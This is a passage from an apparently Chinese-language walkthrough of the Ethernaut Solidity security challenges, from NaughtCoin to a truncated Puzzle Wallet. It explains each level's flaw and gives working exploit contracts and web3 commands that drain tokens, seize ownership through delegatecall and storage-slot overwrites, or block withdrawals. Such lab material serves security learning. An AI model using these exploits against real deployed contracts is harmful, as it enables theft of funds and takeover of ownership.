) ERC20 ( 'NaughtCoin' , '0x0' ) public { player = _player ; INITIAL_SUPPLY = 1000000 * ( 10 ** uint256 ( decimals ())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint ( player , INITIAL_SUPPLY ); emit Transfer ( address ( 0 ), player , INITIAL_SUPPLY ); } function transfer ( address _to , uint256 _value ) override public lockTokens returns ( bool ) { super . transfer ( _to , _value ); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens () { if ( msg.sender == player ) { require ( now > timeLock ); _ ; } else { _ ; } } } \u6839\u636e ERC-20 \u521b\u5efa\u4e86\u4e00\u4e2a\u4ee3\u5e01\uff0c\u5408\u7ea6\u5728 https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol \u9898\u76ee\u7ed9 transfer \u51fd\u6570\u52a0\u4e86 modifier\uff0c\u5224\u65ad\u65f6\u95f4\u5927\u4e8e\u5341\u5e74\u624d\u4f1a\u901a\u8fc7\uff0c\u53d1\u51fa transfer \u4f46\u662f\u6839\u636e ERC-20 \u7684\u5408\u7ea6\u6e90\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd8\u6709\u4e00\u4e2a transferFrom \u51fd\u6570\u53ef\u4ee5\u7528\u6765\u8f6c\u79fb\u4ee3\u5e01 function transferFrom ( address from , address to , uint256 amount ) public virtual override returns ( bool ) { address spender = _msgSender (); _spendAllowance ( from , spender , amount ); _transfer ( from , to , amount ); return true ; } \u800c\u8fd9\u8981\u6d88\u8017 allowance\uff0c\u4f46\u662f approve \u51fd\u6570\u5e76\u6ca1\u6709\u65bd\u52a0\u9650\u5236\uff0c\u6240\u4ee5\u5148 approve \u4e00\u5b9a\u7684\u6570\u91cf\uff0c\u7136\u540e transferFrom \u5c31\u53ef\u4ee5\u8f6c\u79fb\u51fa player \u8eab\u4e0a\u7684\u5168\u90e8\u4ee3\u5e01\u4f59\u989d > ( await contract . balanceOf ( player )). toString () '1000000000000000000000000' > contract . approve ( player , \"1000000000000000000000000\" ) > contract . transferFrom ( player , instance , \"1000000000000000000000000\" ) > ( await contract . balanceOf ( player )). toString () '0' Preservation \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Preservation { // public library contracts address public timeZone1Library ; address public timeZone2Library ; address public owner ; uint storedTime ; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4 ( keccak256 ( \"setTime(uint256)\" )); constructor ( address _timeZone1LibraryAddress , address _timeZone2LibraryAddress ) public { timeZone1Library = _timeZone1LibraryAddress ; timeZone2Library = _timeZone2LibraryAddress ; owner = msg.sender ; } // set the time for timezone 1 function setFirstTime ( uint _timeStamp ) public { timeZone1Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } // set the time for timezone 2 function setSecondTime ( uint _timeStamp ) public { timeZone2Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } } // Simple library contract to set the time contract LibraryContract { // stores a timestamp uint storedTime ; function setTime ( uint _time ) public { storedTime = _time ; } } \u76ee\u6807\u662f\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\u3002\u4f46\u662f\u4ece\u9898\u76ee\u5408\u7ea6\u4e2d\u770b\u4e0d\u5230\u4efb\u4f55\u548c\u66f4\u6539 owner \u6709\u5173\u7684\u51fd\u6570 \u6839\u636e\u63d0\u793a\uff0c\u8fd9\u4e2a\u5408\u7ea6\u7684\u6f0f\u6d1e\u5728\u4e8e\u901a\u8fc7 delegatecall \u4fee\u6539\u5b58\u50a8 \u901a\u8fc7 delegatecall \u6765\u8c03\u7528\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684\u51fd\u6570\u5e76\u4e0d\u4f1a\u52a8\u7528\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684 storage\uff0c\u800c\u662f\u4f7f\u7528\u672c\u5730 storage\u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u5728 setFirstTime \u51fd\u6570\u4e2d\u8c03\u7528 setTime \u51fd\u6570\u65f6\u66f4\u6539 storedTime \u5b9e\u9645\u4e0a\u4f1a\u66f4\u6539\u5904\u4e8e storage \u4e2d\u76f8\u540c\u4f4d\u7f6e\u7684 timeZone1Library\u3002\u8fd9\u6837\u5728\u4e0b\u4e00\u6b21\u8c03\u7528 setFirstTime \u7684\u65f6\u5019\u5c31\u4f1a\u8c03\u7528\u53e6\u4e00\u4e2a\u5730\u5740\u5408\u7ea6\u7684 setTime \u51fd\u6570 \u56e0\u6b64\u53ef\u4ee5\u90e8\u7f72\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u5176\u4e2d\u5b9e\u73b0 setTime \u51fd\u6570\uff0c\u91cc\u9762\u5c06 owner \u6539\u4e3a\u8f93\u5165\uff08\u6ce8\u610f\u8981\u5c06\u653b\u51fb\u5408\u7ea6\u7684\u5185\u5b58\u5e03\u5c40\u641e\u7684\u548c Preservation \u5408\u7ea6\u76f8\u540c\uff09\uff0c\u8fd9\u6837\u7b2c\u4e00\u6b21 setFirstTime \u4f7f\u5c06 timeZone1Library \u6539\u4e3a\u653b\u51fb\u5408\u7ea6\u7684\u5730\u5740\uff0c\u7b2c\u4e8c\u6b21 setFirstTime \u5c31\u53ef\u4ee5\u8c03\u7528\u5230\u653b\u51fb\u5408\u7ea6\u7684 setTime \u51fd\u6570\uff0c\u66f4\u6539 owner\u3002\u653b\u51fb\u5408\u7ea6\uff1a // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { address public timeZone1Library ; address public timeZone2Library ; address public owner ; // \u4fdd\u8bc1\u8fd9\u524d\u9762\u6709\u4e24\u4e2a address function setTime ( uint _time ) public { owner = address ( _time ); } } \u5b9e\u9645\u64cd\u4f5c\uff1a > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000000<an address>' > contract . setFirstTime ( \"0x<Exploit contract address>\" ) > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000000<Exploit contract address>' > contract . setFirstTime ( player ) > await web3 . eth . getStorageAt ( instance , 2 ) // owner '0x000000000000000000000000<player address>' > await contract . owner () '0x<player address>' Recovery \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Recovery { //generate tokens function generateToken ( string memory _name , uint256 _initialSupply ) public { new SimpleToken ( _name , msg.sender , _initialSupply ); } } contract SimpleToken { using SafeMath for uint256 ; // public variables string public name ; mapping ( address => uint ) public balances ; // constructor constructor ( string memory _name , address _creator , uint256 _initialSupply ) public { name = _name ; balances [ _creator ] = _initialSupply ; } // collect ether in return for tokens receive () external payable { balances [ msg.sender ] = msg.value . mul ( 10 ); } // allow transfers of tokens function transfer ( address _to , uint _amount ) public { require ( balances [ msg.sender ] >= _amount ); balances [ msg.sender ] = balances [ msg.sender ]. sub ( _amount ); balances [ _to ] = _amount ; } // clean up after ourselves function destroy ( address payable _to ) public { selfdestruct ( _to ); } } \u9898\u610f\u662f instance \u8c03\u7528\u4e86 generateToken \u751f\u6210\u4e86\u4e00\u4e2a SimpleToken\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u751f\u6210\u7684\u5408\u7ea6\u5730\u5740\uff0c\u73b0\u5728\u8981\u8c03\u7528\u8fd9\u4e2a\u5408\u7ea6\u7684 selfdestruct \u6765\u5c06\u5176\u4e2d\u4f59\u989d\u8f6c\u5230 player \u8d26\u6237\u4e2d \u56e0\u4e3a\u533a\u5757\u94fe\u90fd\u662f\u900f\u660e\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u53bb Etherscan \u7684 Rinkeby \u7f51\u7edc \u4e2d\u67e5\u627e instance \u8fd9\u4e2a\u5730\u5740\u4e0a\u7684\u5408\u7ea6\uff0c\u53ca\u5176\u4e2d\u7684 internal txns\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a Contract Creation\uff0c\u90a3\u4e2a\u5730\u5740\u5c31\u662f\u751f\u6210\u7684 SimpleToken \u5730\u5740\uff0c\u6240\u4ee5\u5199\u4e00\u4e2a exp \u6765\u8c03\u7528\u90a3\u4e2a\u5730\u5740\u4e0a\u7684\u7684 destroy \u51fd\u6570\u5c31\u597d\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of SimpleToken */ contract Exploit { SimpleToken token ; constructor ( address payable challenge ) public { // challenge \u662f\u627e\u5230\u7684 SimpleToken \u5730\u5740 token = SimpleToken ( challenge ); } function exp () public { token . destroy ( msg.sender ); } } MagicNumber \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract MagicNum { address public solver ; constructor () public {} function setSolver ( address _solver ) public { solver = _solver ; } /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ } \u9898\u76ee\u8981\u6c42\u5373\u5199\u4e00\u4e2a\u5408\u7ea6\uff0c\u5b57\u8282\u7801\u4e0d\u8d85\u8fc7 10 \u4e2a\u5b57\u8282\uff0c\u5728\u8c03\u7528 whatIsTheMeaningOfLife() \u65f6\u8fd4\u56de 42 \u6240\u4ee5\u53ef\u4ee5\u624b\u5199\u6c47\u7f16\uff0c\u6765\u5bf9\u4e8e\u6240\u6709\u8c03\u7528\u90fd\u76f4\u63a5\u8fd4\u56de 42\uff0c\u8981\u7528\u5230\u51e0\u4e2a\u6307\u4ee4\uff08\u53ef\u4ee5\u5728 https://ethervm.io/ \u770b\u5230\u8be6\u7ec6\u7684\u6307\u4ee4\u4e0e\u5b57\u8282\u7801\u7684\u5bf9\u5e94\u4ee5\u53ca\u4f5c\u7528\uff09 PUSH1\uff0860\uff09\uff1a\u5c06\u4e00\u4e2a uint8 \u538b\u5165\u6808\u4e2d MSTORE\uff0852\uff09\uff1a\u6808\u9876\u53d6\u51fa offset\uff0c\u518d\u53d6\u51fa value\uff0c\u5c06 memory[offset:offset+32] \u8bbe\u7f6e\u4e3a value RETURN\uff08F3\uff09\uff1a\u6808\u9876\u53d6\u51fa offset\uff0c\u518d\u53d6\u51fa length\uff0creturn memory[offset:offset+length] CODECOPY\uff0839\uff09\uff1a\u4ece\u6808\u4e0a\u4f9d\u6b21\u53d6\u51fa destOffset\u3001offset\u3001length\uff0c\u8bbe\u7f6e memory[destOffset:destOffset+length] = code[offset:offset+length] \u5728\u90e8\u7f72\u5408\u7ea6\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u6709\u4e00\u6bb5 deploy code\uff0c\u7528\u6765\u628a runtime code \u590d\u5236\u5230\u6307\u5b9a\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8981\u7f16\u5199\u4e24\u90e8\u5206\u5b57\u8282\u7801 runtime code: PUSH1 0x2a ; \u5c06 42 \u538b\u5165\u6808\u4e2d PUSH1 0x80 ; \u8981\u5b58\u50a8\u7684\u4f4d\u7f6e\uff0c\u4e00\u822c\u4e3a 0x80 MSTORE ; \u8bbe\u7f6e memory[0x80:0x80+0x20] = 0x2a PUSH1 0x20 ; length PUSH1 0x80 ; offset RETURN ; return memory[0x80:0x80+0x20] \u8f6c\u6362\u6210\u5b57\u8282\u7801\u5c31\u662f\uff1a602a 6080 52 6020 6080 f3 \u63a5\u4e0b\u6765\u8981\u5199 deploy code\uff0c\u5176\u4e2d\u8981\u5b8c\u6210\u4e24\u4e2a\u76ee\u6807\uff1a \u5c06 runtime code \u5b57\u8282\u7801\u62f7\u8d1d\u5230\u5185\u5b58\u4e2d \u5c06 runtime code \u8fd4\u56de EVM \u6c47\u7f16\uff1a PUSH1 0x0a ; length, runtime code \u957f\u5ea6\u4e3a 10 (0x0a) PUSH1 0x0c ; offset, \u5373 deploy code \u7684\u957f\u5ea6\uff0c\u6574\u4f53\u7b97\u4e0b\u6765\u4e3a 0x0C PUSH1 0x00 ; destOffset, \u5b58\u5165\u5185\u5b58\u4e2d\u8d77\u59cb\u4f4d\u7f6e CODECOPY ; \u5c06 runtime code \u62f7\u8d1d\u5230\u5185\u5b58\u5f00\u5934 PUSH1 0x0a ; length PUSH1 0x00 ; offset RETURN ; \u8fd4\u56de runtime code \u8f6c\u6362\u6210\u5b57\u8282\u7801\uff1a600a 600c 6000 39 600a 6000 f3\uff08\u957f\u5ea6\u6b63\u597d\u5bf9\u5e94 0x0c\uff09 \u8fde\u8d77\u6765\u5c31\u662f\u6700\u7ec8\u7684\u5b57\u8282\u7801\uff1a600a600c600039600a6000f3602a60805260206080f3 \u7136\u540e\u901a\u8fc7\u5411\u7a7a\u5730\u5740\u53d1\u9001\u4ea4\u6613\u7684\u5f62\u5f0f\u521b\u5efa\u5408\u7ea6\uff0c\u5e76\u627e\u5230\u5408\u7ea6\u5730\u5740\u518d setSolver \u5373\u53ef > web3 . eth . sendTransaction ({ from : player , data : \"0x600a600c600039600a6000f3602a60805260206080f3\" }) \u26cf\ufe0f Sent transaction \u26cf https : //rinkeby.etherscan.io/tx/<transaction hash> \u26cf\ufe0f Mined transaction \u26cf https : //rinkeby.etherscan.io/tx/<transaction hash> > contract . setSolver ( \"<contract address>\" ) \u5176\u4e2d contract address \u901a\u8fc7\u8bbf\u95ee\u7ed9\u51fa\u7684 etherscan \u7684\u7f51\u5740\u5c31\u53ef\u4ee5\u67e5\u5230\u521b\u5efa\u7684\u5408\u7ea6\u5730\u5740 Alien Codex \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.5.0 ; import '../helpers/Ownable-05.sol' ; contract AlienCodex is Ownable { bool public contact ; bytes32 [] public codex ; modifier contacted () { assert ( contact ); _ ; } function make_contact () public { contact = true ; } function record ( bytes32 _content ) contacted public { codex . push ( _content ); } function retract () contacted public { codex . length -- ; } function revise ( uint i , bytes32 _content ) contacted public { codex [ i ] = _content ; } } \u8981\u6c42\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\uff0c\u8fd9\u4e2a owner \u7684\u5b58\u50a8\u662f\u5728 Ownable \u4e2d\u5b9a\u4e49\u7684\uff0c\u5b83\u4f1a\u548c contact \u4e00\u8d77\u653e\u5728 storage \u7684 slot 0 \u5904\uff0c\u76ee\u7684\u5c31\u662f\u6539\u53d8\u8fd9\u4e2a\u4f4d\u7f6e\u7684\u503c \u800c slot 1 \u7684\u4f4d\u7f6e\u5f00\u59cb\u5c31\u662f codex \u7684\u5b58\u50a8\uff0c\u5148\u662f\u957f\u5ea6\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528 retract() \u51fd\u6570\u6765\u4f7f length \u5411\u4e0b\u6ea2\u51fa\u53d8\u6210 2**256-1\uff0c\u4e5f\u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230\u5168\u90e8\u7684 storage \u533a\u57df\uff0c\u6240\u4ee5\u5c31\u53ea\u9700\u8981\u627e\u5230 slot 0 \u5bf9\u5e94\u7684 codex[i] \u7684 i \u56e0\u4e3a codex[i] \u5b9e\u9645\u4e0a\u662f\u8868\u793a keccak256(slot of codex) + i \u5904\uff0c\u6240\u4ee5\u53ea\u8981\u4ee4 i = 2**256 - keccak256(slot of codex) \u5c31\u53ef\u4ee5\u4f7f\u5176\u53d8\u4e3a 2**256\uff0c\u5373\u6ea2\u51fa\u5230 0 \u7684\u4f4d\u7f6e \u800c codex \u7684 slot \u5c31\u662f 1\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8ba1\u7b97 2**256 - keccak256(1): contract Exploit { function calc () public view returns ( bytes32 ) { return keccak256 ( abi . encode ( bytes32 ( uint ( 1 )))); } } \u5f97\u5230 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6\uff0c\u7528 2**256 \u51cf\u53bb\u5b83\u5f97\u5230 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a \u7136\u540e\u66f4\u6539\u8fd9\u4e2a\u4f4d\u7f6e\u5230 player \u5730\u5740\u5c31\u597d\u4e86\uff08\u8981\u5728\u5730\u5740\u524d\u9762\u8865\u4e0a\u4e00\u5806 0 \u548c contact\uff09 > contract . retract () > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272' > await web3 . eth . getStorageAt ( instance , 1 ) '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' > contract . revise ( \"0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a\" , \"0x000000000000000000000001<player address>\" ) Denial \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Denial { using SafeMath for uint256 ; address public partner ; // withdrawal partner - pay the gas, split the withdraw address payable public constant owner = address ( 0xA9E ); uint timeLastWithdrawn ; mapping ( address => uint ) withdrawPartnerBalances ; // keep track of partners balances function setWithdrawPartner ( address _partner ) public { partner = _partner ; } // withdraw 1% to recipient and 1% to owner function withdraw () public { uint amountToSend = address ( this ). balance . div ( 100 ); // perform a call without checking return // The recipient can revert, the owner will still get their share partner . call { value : amountToSend }( \"\" ); owner . transfer ( amountToSend ); // keep track of last withdrawal time timeLastWithdrawn = now ; withdrawPartnerBalances [ partner ] = withdrawPartnerBalances [ partner ]. add ( amountToSend ); } // allow deposit of funds receive () external payable {} // convenience function function contractBalance () public view returns ( uint ) { return address ( this ). balance ; } } \u76ee\u7684\u662f\u8981\u963b\u6b62 owner \u5728 withdraw \u7684\u65f6\u5019\u63d0\u53d6\u5230\u8d44\u4ea7 \u91cd\u5165\u653b\u51fb\u6ca1\u6709\u6253\u51fa\u6765\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u8ba9\u653b\u51fb\u5408\u7ea6\u7684 fallback \u89e6\u53d1 assert \u5f02\u5e38\uff0c\u8fd9\u6837\u6d88\u8017\u6389\u6240\u6709\u7684 gas \u540e\u5c31\u518d\u6ca1\u6cd5\u6b63\u5e38\u5411 owner \u8f6c\u8d26\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Denial */ contract Exploit { Denial challenge ; constructor ( address payable addr ) public { challenge = Denial ( addr ); } function exp () public { challenge . setWithdrawPartner ( address ( this )); challenge . withdraw (); } receive () external payable { assert ( false ); } } Shop \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; interface Buyer { function price () external view returns ( uint ); } contract Shop { uint public price = 100 ; bool public isSold ; function buy () public { Buyer _buyer = Buyer ( msg.sender ); if ( _buyer . price () >= price && ! isSold ) { isSold = true ; price = _buyer . price (); } } } \u76ee\u7684\u662f\u4f7f price \u5c0f\u4e8e 100\u3002\u548c Elevator \u7c7b\u4f3c\uff0c\u53ea\u8981\u4f7f\u4e24\u6b21\u8c03\u7528 price \u5f97\u5230\u7684\u503c\u4e0d\u4e00\u6837\u5c31\u53ef\u4ee5\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Shop */ contract Exploit { Shop challenge ; constructor ( address addr ) public { challenge = Shop ( addr ); } function price () external view returns ( uint ) { if ( challenge . isSold ()) { return 90 ; } return 100 ; } function exp () public { challenge . buy (); } } Dex & Dex Two \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Dex { using SafeMath for uint ; address public token1 ; address public token2 ; constructor ( address _token1 , address _token2 ) public { token1 = _token1 ; token2 = _token2 ; } function swap ( address from , address to , uint amount ) public { require ( IERC20 ( from ). balanceOf ( msg.sender ) >= amount , \"Not enough to swap\" ); uint swap_amount = get_swap_price ( from , to , amount ); IERC20 ( from ). transferFrom ( msg.sender , address ( this ), amount ); IERC20 ( to ). approve ( address ( this ), swap_amount ); IERC20 ( to ). transferFrom ( address ( this ), msg.sender , swap_amount ); } function add_liquidity ( address token_address , uint amount ) public { IERC20 ( token_address ). transferFrom ( msg.sender , address ( this ), amount ); } function get_swap_price ( address from , address to , uint amount ) public view returns ( uint ){ return (( amount * IERC20 ( to ). balanceOf ( address ( this ))) / IERC20 ( from ). balanceOf ( address ( this ))); } function approve ( address spender , uint amount ) public { SwappableToken ( token1 ). approve ( spender , amount ); SwappableToken ( token2 ). approve ( spender , amount ); } function balanceOf ( address token , address account ) public view returns ( uint ){ return IERC20 ( token ). balanceOf ( account ); } } contract SwappableToken is ERC20 { constructor ( string memory name , string memory symbol , uint initialSupply ) public ERC20 ( name , symbol ) { _mint ( msg.sender , initialSupply ); } } \u9898\u610f\u5c31\u662f\u73a9\u5bb6\u8d26\u6237\u4e0a\u7684 token1 \u548c token2 \u90fd\u5404\u6709 10 \u4e2a token\uff0c\u800c\u9898\u76ee\u8d26\u6237\u4e0a\u6709 100 \u4e2a\uff0c\u76ee\u7684\u662f\u628a\u9898\u76ee\u8d26\u6237\u4e0a\u7684\u67d0\u4e2a token \u6e05\u96f6 \u9898\u76ee\u7684 Dex \u5408\u7ea6\u4e3b\u8981\u63d0\u4f9b\u4e86 swap \u8fd9\u4e2a\u51fd\u6570\u7528\u6765\u5728\u4e24\u4e2a token \u95f4\u4ea4\u6362\u91d1\u989d\u3002\u4f46\u662f\u8f6c\u51fa\u7684\u65f6\u5019\u5148\u8c03\u7528\u4e86 get_swap_price \u6765\u8ba1\u7b97\u91d1\u989d\uff0c\u800c\u4e14\u5728\u5176\u4e2d\u8c03\u7528\u7684\u662f\u4e24\u65b9\u683c\u5b50\u7684 balanceOf \u51fd\u6570\u3002\u56e0\u6b64\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u65b0\u7684 IERC20 \u7684 token\uff0c\u8ba9\u5b83\u7684 balanceOf \u59cb\u7ec8\u8fd4\u56de 1\uff0c\u4f5c\u4e3a\u5206\u6bcd\uff0c\u8fd9\u6837\u8f6c\u51fa\u7684\u65f6\u5019\u5c31\u4f1a\u8f6c\u51fa\u9898\u76ee token \u4e2d\u7684\u6240\u6709\u4f59\u989d\u4e86 Dex Two \u548c Dex \u5dee\u522b\u5c31\u5728\u4e8e DexTwo \u9700\u8981\u5c06\u4e24\u4e2a token \u90fd\u7f6e\u4e3a 0\uff0c\u7528 exp \u51fd\u6570\u5206\u522b\u6253\u4e0b token1 \u548c token2 \u5c31\u884c exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Dex */ contract ExploitToken { function balanceOf ( address account ) public view returns ( uint256 ) { return 1 ; } function transferFrom ( address , address , uint256 ) public returns ( bool ) { return true ; } } contract Exploit { address token = address ( new ExploitToken ()); Dex challenge ; constructor ( address addr ) public { challenge = Dex ( addr ); } function exp ( address token1 ) public { challenge . swap ( token , token1 , 1 ); } } Puzzle Wallet \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; pragma experimental ABIEncoderV2 ; import \"@openzeppelin/contracts/math/SafeMath.sol\" ; import \"@openzeppelin/contracts/proxy/UpgradeableProxy.sol\" ; contract PuzzleProxy is UpgradeableProxy { address public pendingAdmin ; address public admin ; constructor ( address _admin , address _implementation , bytes memory _initData ) UpgradeableProxy ( _implementation , _initData ) public { admin = _admin ; } modifier onlyAdmin { require ( msg.sender == admin , \"Caller is not the admin\" ); _ ; } function proposeNewAdmin ( address _newAdmin ) external { pendingAdmin = _newAdmin ; } function approveNewAdmin ( address _expectedAdmin ) external onlyAdmin { require ( pendingAdmin == _expectedAdmin , \"Expected new admin by the current admin is not the pending admin\" ); admin = pendingAdmin ; } function upgradeTo ( address _newImplementation ) external onlyAdmin { _upgradeTo ( _newImplementation ); } } contract PuzzleWallet { using SafeMath for uint256 ; address public owner ; uint256 public maxBalance ; mapping ( address => bool ) public whitelisted ; mapping ( address => uint256 ) public balances ; function init ( uint256 _maxBalance ) public { require ( maxBalance == 0 , \"Already initialized\" ); maxBalance = _maxBalance ; owner = msg.sender ; } modifier onlyWhitelisted { require ( whitelisted [ msg.sender ], \"Not whitelisted\" ); _ ; } function setMaxBalance ( uint256 _maxBalance ) external onlyWhitelisted { require ( address ( this ). balance == 0 , \"Contract balance is not 0\" ); maxBalance = _maxBalance ; } function addToWhitelist ( address addr ) external { require ( msg.sender == owner , \"Not the owner\" ); whitelisted [ addr ] = true ; } function deposit () external payable onlyWhitelisted { require ( address ( this ). balance <= maxBalance , \"Max balance reached\" ); balances [ msg.sender ] = balances [ msg.sender ]. add ( msg.value ); } function execute ( address to , uint256 value , bytes calldata data ) external payable onlyWhitelisted { require ( balances [ msg.sender ] >= value , \"Insufficient balance\" ); balances [ msg.sender ] = balances [ msg.sender ]. sub ( value ); ( bool success , ) = to . call { value : value }( data ); require ( success , \"Execution failed\" ); } function multicall ( bytes [] calldata data ) external payable onlyWhitelisted { bool depositCalled = false ; for ( uint256 i = 0 ; i < data . length ; i ++ ) { bytes memory _data = data [ i ]; bytes4 selector ; assembly { selector : = mload ( add ( _data , 32 )) } if ( selector == this . deposit . selector ) { require ( ! depositCalled , \"Deposit can only be called once\" ); // Protect against reusing msg.value depositCalled = true ; } ( bool success , ) = address ( this ). delegatecall ( data [ i ]); require ( success , \"Error while delegating call\" ); } } } \u9898\u76ee\u6bd4\u8f83\u590d\u6742\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u4f7f PuzzleProxy \u7684 admin \u4e3a player \u56e0\u4e3a PuzzleProxy \u548c PuzzleWallet \u90e8\u7f72\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u5b83\u4eec\u7684 storage \u4f1a\u5171\u7528\uff0c\u6240\u4ee5\u5c31\u5bfc\u81f4\u4e86 PuzzleProxy \u7684 pendingAdmin \u5bf9\u5e94\u4e86 PuzzleWallet \u7684 owner\uff0cPuzzleWallet \u7684 maxBalance \u5bf9\u5e94\u4e86 PuzzleProxy \u7684 admin \u4ece\u540e\u5f80\u524d\u63a8\uff1a \u8981\u4f7f admin \u53d8\u4e3a player\uff0c\u5219\u53ef\u4ee5\u8bbe\u7f6e maxBalance \u4e3a player \u800c setMaxBalance \u51fd\u6570\u9700\u8981\u5148\u4f7f\u5f53\u524d\u5408\u7ea6\u8d26\u6237\u7684\u4f59\u989d\u53d8\u4e3a 0 \u5408\u7ea6\u8d26\u6237\u4f59\u989d\u51cf\u5c11\u7684\u65b9\u5f0f\u5728 execute \u4e2d\u7684 call\uff0c\u4f7f\u4f59\u989d\u51cf\u5c11 value \u4f46\u8fd9\u6837\u8981\u4f7f balances[player] >= value \u800c\u901a\u8fc7 deposit \u589e\u52a0 balances[player] \u7684\u8bdd\uff0c\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u4e5f\u4f1a\u540c\u6b65\u589e\u52a0 \u6240\u4ee5\u8981\u4f7f\u7528 multicall \u51fd\u6570\u6765\u4f7f balances[player] \u589e\u52a0\u91cf\u4e3a\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u589e\u52a0\u91cf\u7684\u4e8c\u500d \u4f46\u662f multicall \u4e2d\u68c0\u6d4b\u4e86 selector \u4f7f deposit \u53ea\u80fd\u8c03\u7528\u4e00\u6b21 \u8fd9\u53ef\u4ee5\u901a\u8fc7 multicall \u4e2d\u6267\u884c\u4e24\u4e2a multicall\uff0c\u6bcf\u4e2a multicall \u8c03\u7528\u4e00\u6b21 deposit \u8fd9\u6837\u5206\u6790\u4e4b\u540e\u95ee\u9898\u5c31\u89e3\u51b3\u4e86\uff0c\u9996\u5148\u8c03\u7528 proposeNewAdmin \u6765\u4f7f pendingAdmin\uff08owner\uff09\u53d8\u4e3a player\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u53d1\u9001\u5408\u7ea6\u7684\u65b9\u5f0f\u8c03\u7528 > await web3 . eth . getStorageAt ( instance , 0 ) // owner '0x000000000000000000000000<level address>' > web3 . utils . sha3 ( \"proposeNewAdmin(address)\" ). slice ( 0 , 10 ) // selector '0xa6376746' > data = web3 . utils . sha3 ( \"proposeNewAdmin(address)\" ). slice ( 0 , 10 ) + player . slice ( 2 ). padStart ( 64 , \"0\" ) '0xa6376746000000000000000000000000<player address>' > web3 . eth . sendTransaction ({ from : player , to : instance , data : data }) > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000000<player address>' \u7136\u540e\u62ff\u5230 owner \u540e\u9700\u8981\u5c06\u81ea\u5df1\u52a0\u5165\u767d\u540d\u5355\uff0c\u5e76\u4e14\u5148\u67e5\u8be2\u4e00\u4e0b\u5408\u7ea6\u8d26\u6237\u4f59\u989d > await contract . addToWhitelist ( player ) > await getBalance ( instance ) '0.001' \u6240\u4ee5\u9700\u8981\u6784\u9020\u4e00\u4e2a 